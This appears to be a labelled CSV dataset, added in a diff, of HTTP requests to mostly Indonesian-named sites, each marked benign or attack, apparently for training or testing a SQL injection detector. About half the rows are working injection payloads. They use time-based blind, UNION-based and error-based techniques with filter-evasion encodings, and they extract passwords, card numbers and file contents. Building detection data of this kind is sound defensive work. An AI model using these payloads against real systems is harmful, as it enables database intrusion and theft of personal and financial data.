@@ -1,0 +1,71 @@
+payload,label
+GET http://shop.tokobatik.id/catalog?category=modern&page=2&sort=price_asc,benign
+"GET http://portal.siakad-unibraw.ac.id/nilai?nim=195150401&sem=5' /*!50000AND*/ /*!50000SLEEP*/(5)--",attack
+POST http://api.logistik-andalan.co.id/pickup?sender=PT-Maju&city=malang&weight=2kg,benign
+"GET http://cms.beritamalang.id/read?id=881'%09UNION%09SELECT%09NULL,username,password%09FROM%09users--",attack
+GET http://dashboard.smartmeter.pln.id/usage?meter_id=M-004421&month=6&year=2024,benign
+"GET http://erp.distributor-sembako.id/stock?item_id=ITM-221'%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(4)))a)--",attack
+POST http://app.klinik-sehat.id/antrian?poli=umum&pasien_id=P8812&date=2024-07-15,benign
+"GET http://backend.tikettour.id/paket?pid=PKT-441'%0AUNION%0ASELECT%0ANULL,CONCAT(cc_number,0x3a,cvv),NULL%0AFROM%0Apayment_data--",attack
+GET http://monitor.irigasi-jatim.id/debit?pintu=PA-07&tanggal=2024-07-01&status=normal,benign
+"GET http://admin.portalbisnis.id/vendor?vid=VND-9921' AND 0x313d31 AND SLEEP(3)--",attack
+GET http://portal.pustaka-daerah.id/koleksi?kategori=fiksi&tahun=2020&tersedia=true,benign
+"GET http://api.simpeg-bkd.id/pns?nip=198504012010011002'||(SELECT 0x41 FROM dual WHERE SLEEP(3)=0)||'",attack
+POST http://app.absensi-pabrik.id/checkin?emp_id=E4421&shift=pagi&gate=G1,benign
+"GET http://shop.elektronikjaya.id/product?pid=1002 /*!UNION*/ /*!SELECT*/ NULL,NULL,@@version--",attack
+GET http://tracker.armada-bus.id/bus?bus_id=BUS-0081&route=MLG-SBY&date=2024-07-01,benign
+"GET http://portal.disdukcapil-kota.id/penduduk?nik=3573011234560001'%20AND%20ASCII(SUBSTRING((SELECT%20password%20FROM%20admin%20LIMIT%201),1,1))%3E97--",attack
+GET http://api.reservasi-lapangan.id/slot?venue=GOR-Kanjuruhan&date=2024-07-20&sport=badminton,benign
+"GET http://crm.agenbpjs.id/peserta?id=990100441882'%0d%0aAND%0d%0a1=1%0d%0aUNION%0d%0aSELECT%0d%0aNULL,password,NULL%0d%0aFROM%0d%0ausers--",attack
+GET http://dashboard.solarcell-monitor.id/panel?site=Batu-01&date=2024-07-01&output=kwh,benign
+"GET http://api.simda-daerah.id/anggaran?kode=5.2.1.01'/**/AND/**/SLEEP(5)--",attack
+POST http://api.manajemen-kos.id/kamar?kos_id=KS-0221&kamar=12&status=kosong,benign
+"GET http://backend.marketplace-ukm.id/produk?id=PRD-881' AND UPDATEXML(1,CONCAT(0x7e,MID((SELECT password FROM users ORDER BY id LIMIT 1),1,20)),1)--",attack
+GET http://portal.pengaduan-masyarakat.id/laporan?kategori=infrastruktur&status=proses&kota=malang,benign
+"GET http://api.akademik-polinema.ac.id/mahasiswa?nim=1841234' AND (CASE WHEN (SELECT SUBSTR(database(),1,1))='p' THEN BENCHMARK(3000000,MD5(1)) ELSE 0 END)--",attack
+GET http://app.budgeting-keluarga.id/pengeluaran?bulan=6&tahun=2024&kategori=makan,benign
+"GET http://erp.perusahaan-tambang.id/laporan?shift_id=SH-0341'%09AND%09(SELECT%09COUNT(*)%09FROM%09information_schema.tables)>0%09AND%09SLEEP(2)--",attack
+POST http://api.sertifikasi-bnsp.id/uji?peserta_id=P9921&skema=junior-programmer&tanggal=2024-07-10,benign
+"GET http://cms.radiomalang.fm/program?id=881' AND 1=(SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT HEX(password) FROM admin LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",attack
+GET http://monitor.tambak-udang.id/kolam?kolam_id=K-07&param=do&date=2024-07-01,benign
+"GET http://portal.bapenda-kabupaten.id/wpop?objek=PBB-2024-0081' UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(nama_wajib_pajak,0x3a,npwp),NULL%20FROM%20wajib_pajak--",attack
+GET http://api.siakad-polije.ac.id/jadwal?prodi=TI&semester=5&tahun=2024,benign
+"GET http://backend.toko-herbal.id/item?id=221'%00UNION%00SELECT%00NULL,NULL,username,password,NULL%00FROM%00admin_users--",attack
+POST http://app.manajemen-gudang.id/barang?kode=BRG-4421&lokasi=rak-B3&qty=150,benign
+"GET http://api.sirup-kemenpan.id/jabatan?kode=JP-0021' AND ELT(1,SLEEP(5))--",attack
+GET http://dashboard.plts-ntt.id/inverter?inverter_id=INV-03&date=2024-07-01&param=output,benign
+"GET http://portal.pengadaan-lpse.id/tender?tid=TND-2024-0881'%20AND%20MAKE_SET(1%3D1,SLEEP(4))--",attack
+GET http://api.kependudukan-disdukcapil.id/cetak?jenis=kk&nik=3573012345670002&status=aktif,benign
+"GET http://backend.forum-jual-beli.id/iklan?id=8812' AND CHAR(49)%3DCHAR(49) UNION SELECT NULL,CONCAT(email,0x3a,pass_hash),NULL FROM member_accounts--",attack
+GET http://portal.rsud-kanjuruhan.id/kamar?kelas=3&poli=bedah&status=tersedia,benign
+"GET http://api.parkir-pintar.id/slot?id=SLT-441' AND (SELECT LCASE(MID(version(),1,1)))='5'--",attack
+POST http://api.simpatda-pemkot.id/pajak?wp_id=WP-2291&jenis=reklame&tahun=2024,benign
+"GET http://admin.galerifilm.id/movie?mid=221' AND ORD(MID((SELECT GROUP_CONCAT(table_name SEPARATOR 0x2c) FROM information_schema.tables WHERE table_schema=database()),1,1))>64--",attack
+GET http://monitor.depo-pertamina.id/tangki?id=TK-08&produk=pertalite&date=2024-07-01,benign
+"GET http://api.simhp-dinkes.id/puskesmas?id=PKM-012'%0bAND%0bSLEEP(3)%0b--",attack
+GET http://portal.baznas-malang.id/donasi?program=beasiswa&bulan=6&tahun=2024,benign
+"GET http://backend.agen-properti.id/listing?lid=8812' UNION SELECT NULL,NULL,NULL,CONCAT(0x7e,schema_name,0x7e),NULL FROM information_schema.schemata--",attack
+POST http://api.manajemen-event.id/peserta?event_id=EVT-4421&nama=Budi+Santoso&email=budi@mail.id,benign
+"GET http://portal.dispora-kota.id/atlet?id=ATL-221' AND RLIKE SLEEP(4)--",attack
+GET http://app.pencatatan-produksi.id/batch?lini=L2&tanggal=2024-07-01&produk=SKU-991,benign
+"GET http://api.simpeg-pemkab.id/pegawai?nip=199001012020011003'+AND+(SELECT+*+FROM+(SELECT(SLEEP(3)))a)--",attack
+GET http://monitor.waduk-sutami.id/muka-air?tanggal=2024-07-01&status=normal&elevasi=271m,benign
+"GET http://backend.direktori-umkm.id/toko?id=TK-881' AND (SELECT 1 WHERE 1=1 AND 0x313D31 AND SLEEP(3))--",attack
+POST http://api.simas-bri.id/tabungan?rek=009801234567890&pin=****&tipe=simpedes,benign
+"GET http://cms.portal-desa.id/berita?id=221'%20PROCEDURE%20ANALYSE(EXTRACTVALUE(5672,CONCAT(0x5c,(SELECT%20password%20FROM%20admin%20LIMIT%201))),1)--",attack
+GET http://dashboard.supply-chain.id/po?po_id=PO-9921&vendor=VND-441&status=approved,benign
+"GET http://api.siakad-stiki.ac.id/nilai?nim=1234567' AND IF(ORD(SUBSTR(database(),1,1))>100,SLEEP(3),0)--",attack
+GET http://portal.siaran-tvri-jatim.id/jadwal?hari=senin&pukul=19.00&program=berita,benign
+"GET http://erp.kontraktor-sipil.id/proyek?pid=PRJ-881' UNION SELECT NULL,NULL,NULL,NULL,LOAD_FILE(0x2F6574632F706173737764)--",attack
+POST http://api.siswa-online.id/nilai?nis=2021001&mapel=matematika&semester=2,benign
+"GET http://backend.warung-digital.id/menu?id=MNU-441'%20AND%20EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT%20GROUP_CONCAT(username,0x3a,password)%20FROM%20users)))--",attack
+GET http://monitor.gardu-induk.id/trafo?id=TF-02&region=malang&param=beban,benign
+"GET http://portal.kpu-jatim.id/dpt?nik=3573091234560003' AND (SELECT CHAR(114)+CHAR(111)+CHAR(111)+CHAR(116))>0 AND SLEEP(3)--",attack
+GET http://api.parkir-rs.id/tiket?tiket_id=TKT-882&lantai=2&status=aktif,benign
+"GET http://admin.toko-online-premium.id/order?oid=ORD-9921'/*!50000UNION*//*!50000SELECT*/NULL,CONCAT(nama,0x3a,alamat,0x3a,no_hp),NULL,NULL FROM customer_data--",attack
+GET http://dashboard.hr-management.id/karyawan?dept=it&status=aktif&lokasi=malang,benign
+"GET http://api.simbg-atrbpn.id/sertifikat?nib=12345678901' AND (SELECT IFNULL(CAST(TABLE_NAME AS CHAR),0x20) FROM information_schema.TABLES WHERE table_schema=database() LIMIT 1,1)>'a'--",attack
+POST http://app.manajemen-aset-sekolah.id/inventaris?sekolah_id=SDN-0021&kategori=elektronik&kondisi=baik,benign
+"GET http://backend.portal-alumni.id/member?id=ALM-441'%20UNION%20SELECT%20NULL,NULL,NULL,CONCAT(email,0x7c,password_hash),NULL,NULL%20FROM%20users--",attack
+GET http://monitor.bts-telkomsel.id/site?site_id=MGL-0441&param=signal&date=2024-07-01,benign
+"GET http://api.simantu-pupr.id/jembatan?id=JMB-0021' AND (SELECT CASE WHEN (SELECT SUBSTR(password,3,1) FROM admin LIMIT 1)='m' THEN SLEEP(5) ELSE 0 END)--",attack
